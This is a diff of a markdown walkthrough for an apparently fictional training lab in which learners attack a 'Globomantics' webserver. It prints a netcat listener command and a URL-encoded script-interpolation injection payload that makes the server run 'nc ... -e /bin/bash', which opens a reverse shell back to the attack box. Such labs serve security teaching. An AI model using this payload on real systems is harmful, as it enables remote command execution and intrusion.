@@ -35,5 +35,5 @@ Globomantics is under cyber seige by the nefarious Dark Kittens Collective hacki
 + Leaving calling cards is cool, but we need more to take down these cats. Let's use the same proof of concept to get a reverse shell on the webserver.
 + In the interactive attack box shell, setup a listener `nc -nlvp 8888`
 + To iniative the reverse shell, run `docker exec -it $(docker ps -aqf "name=attack-box") curl -XGET '10.0.0.3:8080/search?n=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%2010.0.0.7%208888%20-e%20%2Fbin%2Fbash%27%29%7D'`
-  + Verify access, type `id`
+  + Verify access, in the listener window see the connect line and type `id`
   + **Install the lazer pointer program and watch chaos of the Dark Kittens Collective as they destory each other from within.**
